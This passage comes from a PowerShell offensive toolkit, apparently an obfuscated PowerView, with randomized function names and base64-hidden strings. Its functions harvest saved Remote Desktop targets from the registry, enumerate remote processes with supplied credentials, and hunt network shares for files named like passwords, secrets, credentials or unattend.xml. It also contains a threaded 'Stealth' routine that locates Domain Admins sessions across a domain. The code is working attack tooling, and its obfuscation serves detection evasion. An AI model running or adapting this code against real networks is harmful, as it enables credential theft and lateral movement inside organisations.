            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA=')))
        }
        if(!$Reg) {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACwAIABsAGkAawBlAGwAeQAgAGkAbgBzAHUAZgBmAGkAYwBpAGUAbgB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAbwByACAAZgBpAHIAZQB3AGEAbABsACAAcgB1AGwAZQBzACAAbwBuACAAaABvAHMAdAA=')))
        }
        else {
            $UserSIDs = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
            foreach ($UserSID in $UserSIDs) {
                try {
                    $UserName = ElminutColatCably $UserSID
                    $ConnectionKeys = $Reg.EnumValues($HKU,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAFMASQBEAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA=')))).sNames
                    foreach ($Connection in $ConnectionKeys) {
                        if($Connection -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                            $TargetServer = $Reg.GetStringValue($HKU, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAFMASQBEAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwARABlAGYAYQB1AGwAdAA='))), $Connection).sValue
                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $UserSID
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $TargetServer
                            $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                            $FoundConnection
                        }
                    }
                    $ServerKeys = $Reg.EnumKey($HKU,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAFMASQBEAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwA=')))).sNames
                    foreach ($Server in $ServerKeys) {
                        $UsernameHint = $Reg.GetStringValue($HKU, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAFMASQBEAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABUAGUAcgBtAGkAbgBhAGwAIABTAGUAcgB2AGUAcgAgAEMAbABpAGUAbgB0AFwAUwBlAHIAdgBlAHIAcwBcACQAUwBlAHIAdgBlAHIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                        $FoundConnection = New-Object PSObject
                        $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                        $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                        $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $UserSID
                        $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                        $FoundConnection | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $UsernameHint
                        $FoundConnection   
                    }
                }
                catch {
                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByADoAIAAkAF8A')))
                }
            }
        }
    }
}
function DianChariaDesia {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword
    )
    process {
        if($ComputerName) {
            $ComputerName = InfeerismAltersDitronite -Object $ComputerName          
        }
        else {
            $ComputerName = [System.Net.Dns]::GetHostName()
        }
        $Credential = $Null
        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
                try {
                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | % {
                        $Owner = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                        $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                        $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                        $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Owner.Domain
                        $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) $Owner.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABlAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAZQBzACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
                }
            }
            else {
                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABSAGUAbQBvAHQAZQBQAGEAcwBzAHcAbwByAGQAIABtAHUAcwB0ACAAYQBsAHMAbwAgAGIAZQAgAHMAdQBwAHAAbABpAGUAZAAhAA==')))
            }
        }
        else {
            try {
                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | % {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Owner.Domain
                    $Process | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))) $Owner.User
                    $Process
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABlAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAZQBzACwAIABhAGMAYwBlAHMAcwAgAGwAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
            }
        }
    }
}
function InfutumGirozoSynther {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',
        [String[]]
        $Terms,
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $UsePSDrive,
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        $SearchTerms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABhAHMAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAG4AcwBpAHQAaQB2AGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAaQBuAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGMAcgBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AG0AZABrAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAZABlAG4AdABpAGEAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAG8AbgBmAGkAZwA='))))
        if(!$Path.EndsWith('\')) {
            $Path = $Path + '\'
        }
        if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }
        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $SearchTerms = $Terms
        }
        if(-not $SearchTerms[0].startswith("*")) {
            for ($i = 0; $i -lt $SearchTerms.Count; $i++) {
                $SearchTerms[$i] = ("*{0}*" -f $($SearchTerms[$i]))
            }
        }
        if ($OfficeDocs) {
            $SearchTerms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        if($FreshEXEs) {
            $LastAccessTime = (get-date).AddDays(-7).ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            $SearchTerms = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA==')))
        }
        if($UsePSDrive) {
            $Parts = $Path.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAUABhAHQAaAAgAHUAcwBpAG4AZwAgAGEAIAB0AGUAbQBwACAAUABTAEQAcgBpAHYAZQAgAGEAdAAgACQAUgBhAG4AZABEAHIAaQB2AGUA')))
            try {
                $Null = ndr -Name $RandDrive -Credential $Credential -PSProvider FileSystem -Root $FolderPath -ErrorAction Stop
            }
            catch {
                Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQAUABhAHQAaAAgADoAIAAkAF8A')))
                return $Null
            }
            $Path = $RandDrive + ":\" + $FilePath
        }
    }
    process {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAGUAYQByAGMAaAAgAHAAYQB0AGgAIAAkAFAAYQB0AGgA')))
        function PhiticGelanitisUnseve {
            [CmdletBinding()]param([String]$Path)
            try {
                $Filetest = [IO.FILE]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }
        $SearchArgs =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $SearchTerms
            'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
        }
        ls @SearchArgs | % {
            Write-Verbose $_
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | % {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | % {
            if((-not $CheckWriteAccess) -or (PhiticGelanitisUnseve -Path $_.FullName)) {$_}
        } | select FullName,@{Name=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')));Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | % {
            if($OutFile) {PreenicCualiaQuinome -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }
    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAFIAYQBuAGQARAByAGkAdgBlAA==')))
            gdr -Name $RandDrive -ErrorAction SilentlyContinue | rdr
        }
    }
}
function RableBelfTranks {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,
        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,
        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,
        [Int]
        $Threads = 20,
        [Switch]
        $NoImports
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        Write-Verbose ("[*] Total number of hosts: {0}" -f $($ComputerName.count))
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        if(!$NoImports) {
            $MyVars = gv -Scope 2
            $VorbiddenVars = @("?",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))))
            ForEach($Var in $MyVars) {
                if($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach($Function in (ls Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()
        $Jobs = @()
        $PS = @()
        $Wait = @()
        $Counter = 0
    }
    process {
        ForEach ($Computer in $ComputerName) {
            if ($Computer -ne '') {
                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    sleep -MilliSeconds 500
                }
                $PS += [powershell]::create()
                $PS[$Counter].runspacepool = $Pool
                $Null = $PS[$Counter].AddScript($ScriptBlock).AddParameter($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), $Computer)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$Counter].AddParameter($Param.Name, $Param.Value)
                    }
                }
                $Jobs += $PS[$Counter].BeginInvoke();
                $Wait += $Jobs[$Counter].AsyncWaitHandle
            }
            $Counter = $Counter + 1
        }
    }
    end {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdABpAG4AZwAgAGYAbwByACAAcwBjAGEAbgBuAGkAbgBnACAAdABoAHIAZQBhAGQAcwAgAHQAbwAgAGYAaQBuAGkAcwBoAC4ALgAuAA==')))
        $WaitTimeout = Get-Date
        while ($($Jobs | ? {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $WaitTimeout).totalSeconds) -gt 60) {
                sleep -MilliSeconds 500
            }
        for ($y = 0; $y -lt $Counter; $y++) {
            try {
                $PS[$y].EndInvoke($Jobs[$y])
            } catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQByAHIAbwByADoAIAAkAF8A')))
            }
            finally {
                $PS[$y].Dispose()
            }
        }
        $Pool.Dispose()
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIAB0AGgAcgBlAGEAZABzACAAYwBvAG0AcABsAGUAdABlAGQAIQA=')))
    }
}
function BishnessWaryUncane {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $Unconstrained,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $AdminCount,
        [Switch]
        $AllowDelegation,
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All",
        [Switch]
        $ForeignUsers,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBVAHMAZQByAEgAdQBuAHQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [Array]$ComputerName = @()
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                $TargetDomains = MegatedJuloInternate | % { $_.Name }
            }
            else {
                $TargetDomains = @( (PrectusEmbakedTects).name )
            }
            if($Stealth) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAAgAG0AbwBkAGUAIQAgAEUAbgB1AG0AZQByAGEAdABpAG4AZwAgAGMAbwBtAG0AbwBuAGwAeQAgAHUAcwBlAGQAIABzAGUAcgB2AGUAcgBzAA==')))
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAAgAHMAbwB1AHIAYwBlADoAIAAkAFMAdABlAGEAbAB0AGgAUwBvAHUAcgBjAGUA')))
                ForEach ($Domain in $TargetDomains) {
                    if (($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA=')))) -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEYAaQBsAGUAIABTAGUAcgB2AGUAcgBzAC4ALgAuAA==')))
                        $ComputerName += LydancyUnderrySchronial -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMA')))) -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEQARgBTACAAUwBlAHIAdgBlAHIAcwAuAC4ALgA=')))
                        $ComputerName += ThersReassireIdo -Domain $Domain -DomainController $DomainController | % {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq "DC") -or ($StealthSource -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAC4ALgAuAA==')))
                        $ComputerName += GookHyperifSes -LDAP -Domain $Domain -DomainController $DomainController | % { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                    $Arguments = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }
                    $ComputerName += GrochoniIncunnerMoustic @Arguments
                }
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        $TargetUsers = @()
        $CurrentUser = ([Environment]::UserName).toLower()
        if($ShowAll -or $ForeignUsers) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
